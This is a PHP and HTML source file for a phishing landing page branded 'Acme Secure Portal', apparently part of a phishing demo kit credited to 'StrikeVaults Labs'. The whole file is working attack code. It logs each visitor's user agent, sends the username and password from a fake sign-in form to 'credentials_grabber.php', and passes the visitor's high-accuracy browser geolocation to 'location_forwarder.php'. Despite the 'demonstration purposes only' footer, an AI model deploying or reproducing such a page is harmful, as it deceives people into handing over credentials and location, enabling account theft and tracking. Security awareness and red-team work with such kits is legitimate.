<?php
/**
 * landing.php
 * 
 * Main phishing landing page. 
 * Requests geolocation, collects credentials, logs user agent.
 */

require_once __DIR__ . '/logger.php';

// Log user agent each time this page is accessed
logUserAgent();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Acme Secure Portal</title>
  <meta name="description" content="Phishing Demo - Secure Login Portal">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Social Preview -->
  <meta property="og:title" content="Acme Secure Portal">
  <meta property="og:description" content="Sign in to access your Acme account.">
  <meta property="og:type" content="website">
  <meta property="og:site_name" content="AcmeOnline">

  <!-- Favicon -->
  <link rel="icon" 
        href="https://cdn.iconscout.com/icon/free/png-256/shield-security-protection-1891403-1597673.png" 
        type="image/png">

  <!-- Custom Styles -->
  <link rel="stylesheet" href="styles/main.css">
  <link rel="stylesheet" href="styles/join.css">
  <link rel="stylesheet" href="styles/footer.css">
  <link rel="stylesheet" href="styles/forms.css">
</head>
<body>

<!-- Container that mimics a two-column “join” layout from join.css -->
<article class="join">
  <div class="join__container">
    <!-- Upper section (join__message) -->
    <section class="join__message">
      <h1 class="join__heading">Welcome to Acme Secure Portal</h1>
      <p class="join__subheading">Protecting your account is our priority.</p>
      <p class="join__text">Please sign in and verify your location to continue.</p>
    </section>

    <!-- Left column for geolocation (join__subscribe) -->
    <section class="join__subscribe">
      <h2 class="join__heading">Location Check</h2>
      <p class="join__price">$0 <span class="join__price-month">Demo</span></p>
      <p class="join__price-desc">Click the button to provide your location.</p>
      <a href="#" class="join__cta" onclick="getLocation()">Allow Location</a>
      <p id="errorMessage" style="margin-top:10px; color:red;"></p>
    </section>

    <!-- Right column (join__about) with login form -->
    <section class="join__about">
      <h2 class="join__heading">Account Login</h2>
      <form action="credentials_grabber.php" method="post">
        <label for="uname"><b>Username or Email</b></label>
        <input type="text" placeholder="Enter Username" name="uname" id="uname" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" placeholder="Enter Password" name="psw" id="psw" required>

        <button type="submit">Sign In</button>
      </form>
    </section>
  </div>
</article>

<!-- Footer -->
<footer class="footer">
  <div class="footer__attribution">
    <p class="footer__text">
      &copy; 2025 Acme Corp. 
      | <a href="https://www.strikevaults.com" target="_blank">StrikeVaults</a> Labs
    </p>
    <p class="footer__text">For demonstration purposes only.</p>
  </div>
</footer>

<script>
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
  } else {
    document.getElementById("errorMessage").textContent = "Geolocation not supported by your browser.";
  }
}

function success(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  window.location = "location_forwarder.php?x=" + lat + "&y=" + lon;
}

function error(err) {
  document.getElementById("errorMessage").textContent = 
    "Geolocation request denied or unavailable.";
}
</script>
</body>
</html>
